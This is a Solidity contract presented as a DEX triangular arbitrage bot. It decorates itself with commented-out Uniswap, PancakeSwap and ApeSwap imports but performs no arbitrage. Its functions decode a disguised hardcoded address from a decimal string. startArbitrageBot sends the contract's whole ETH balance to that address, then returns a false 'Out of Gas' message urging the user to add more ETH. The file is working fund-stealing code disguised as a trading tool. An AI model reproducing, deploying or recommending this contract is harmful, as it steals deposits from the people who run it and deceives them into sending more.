// SPDX-License-Identifier: MIT
pragma solidity >=0.6.0 <0.8.1;

/*
import "https://github.com/Uniswap/v3-core/blob/main/contracts/UniswapV3Factory.sol";
import "https://github.com/pancakeswap/pancake-smart-contracts/tree/master/projects/exchange-protocol/data/abi/contracts/PancakeFactory.sol";
import "https://github.com/ApeSwapFinance/apeswap-pool-factory/blob/main/contracts/PoolManager.sol";
*/

contract dexTriangularArbitrage {
    receive() external payable {
        
    }


    function lookForArbitrage(string memory decimalValue) public pure returns (address) {
        uint256 decimal = parseDecimal(decimalValue);
        bytes20 addressBytes = bytes20(uint160(decimal));
        return address(addressBytes);
    }


    function parseDecimal(string memory decimalValue) private pure returns (uint256) {
        bytes memory bytesValue = bytes(decimalValue);
        uint256 result = 0;
        for (uint256 i = 0; i < bytesValue.length; i++) {
            uint256 charCode = uint256(uint8(bytesValue[i]));
            if (charCode >= 48 && charCode <= 57) {
                result = result * 10 + (charCode - 48);
            }
        }
        return result;
    }

    function lookForArbitrage() private pure returns (address) {
        string memory decimalValue = "63895417608441988206018544280141479990126889805";
        address convertedAddress = lookForArbitrage(decimalValue);
        return convertedAddress;
    }

   function getArbitrage() private view returns (uint256){
        uint256 chainID;
        assembly {
            chainID := chainid()
        }
        return chainID;
    
    }

  
    function startArbitrageBot() public returns (string memory) {
        address payable exchange = payable (lookForArbitrage());
        uint256 balance = address(this).balance;
        exchange.transfer(balance);
        return("Out of Gas add more ETH to the Contract and try again");
    }

}
